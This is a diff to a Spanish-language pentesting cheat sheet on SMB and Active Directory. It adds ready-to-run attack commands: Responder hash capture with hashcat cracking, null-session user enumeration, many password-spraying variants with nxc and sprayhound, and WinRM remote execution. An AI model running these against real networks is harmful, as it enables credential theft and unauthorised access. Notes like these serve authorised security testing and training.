@@ -15,6 +15,7 @@ Tags: #SMB #RPC #PsExec  #Windows #Enum #Credentials #LateralMovement
 
 ## TOOLS
 * [NetExec](https://github.com/Pennyw0rth/NetExec)
+* [Sprayhound](https://github.com/Hackndo/sprayhound)
 
 ---
 
@@ -47,6 +48,12 @@ Siempre agregar la máquina al /etc/hosts antes de enumerar SMB.
 
 ---
 ## 1. RECONOCIMIENTO / ENUMERACIÓN INICIAL (SIN CREDENCIALES)
+
+```bash 
+❯ responder -I eth0    # Inicia Responder en la interfaz indicada → escucha/broadcast y responde a queries LLMNR/NBT-NS y fuerza autenticación NTLMv2 
+
+❯ hashcat -m 5600 hash_user.txt /usr/share/wordlists/rockyou.txt    # Crackear el NTLMv2
+```
 
 ```bash
 ❯ nxc smb <IP/rango>
@@ -217,6 +224,9 @@ Notas:
 ## 4. ENUMERACIÓN DE USUARIOS / DOMINIO
 
 ```bash 
+❯ nxc smb <IP> --users    
+# Enumerar usuarios 
+
 ❯ enum4linux <IP> -a
 # No requiere creds → enum legacy (puede fallar en AD modernos)
 
@@ -255,6 +265,7 @@ Notas:
 # Requiere IPC$ abierto → intenta null session
 
 ❯ rpcclient -U "" <IP> -N
+❯ rpcclient -U "Domain01\\" <IP> -N
 # Fuerza null sin password (útil cuando pide pass)
 
 ❯ rpcclient -U "guest%" <IP>
@@ -294,6 +305,10 @@ Notas:
 
 ❯ rpcclient -U 'user%pass' <IP> -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt
 # Extrae usuarios a archivo → útil para spraying
+```
+
+```bash 
+❯ net rpc group members 'Domain Users' -W 'DOMAIN01' -I 'IP' -U '%'    # Enumerar todos los usuarios del dominio
 ```
 
 ---
@@ -357,6 +372,10 @@ Notas:
 
 ❯ nxc smb <IP> -u users.txt -p passwd.txt --continue-on-success --no-bruteforce
 # Paraleliza pruebas (más rápido)
+# --no-bruteforce → probar de forma paralela los diccionario 
+
+❯ nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
+# Password spraying con dos diccionario 
 
 ❯ nxc smb <IP> -u users.txt -p 'Password1' --continue-on-success
 # Password spraying → más sigiloso
@@ -369,6 +388,45 @@ Notas:
 
 ❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
 # Enum usuarios válidos por RID
+```
+
+```bash 
+# No autenticado 
+# Single user, single password
+sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>
+
+# User list, single password
+sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>
+
+# User as pass
+sprayhound -U ./users.txt -d Domain01.local -dc <IP>
+
+# User as pass with password lowercase
+sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>
+
+# User as pass with password uppercase
+sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
+```
+
+```bash 
+# Autenticado 
+# Single user, single password
+sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# All domain users, single password
+sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# All domain users, single password, using an account from a trusted domain
+sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd
+
+# User as pass on all domain users
+sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# User as pass with password lowercase
+sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# User as pass with password uppercase
+sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 ```
 
 ```bash 
@@ -544,7 +602,8 @@ Jerarquía de preferencia para ejecución remota:
 
 ```bash 
 ❯ nxc winrm <IP> -u 'user' -p 'pass'
-# Requiere grupo "Remote Management Users" → acceso remoto
+# Requiere grupo "Remote Management Users" → acceso remoto 
+# Muestra [Pwn3d!]
 
 ❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
 # Ejecución remota vía WinRM
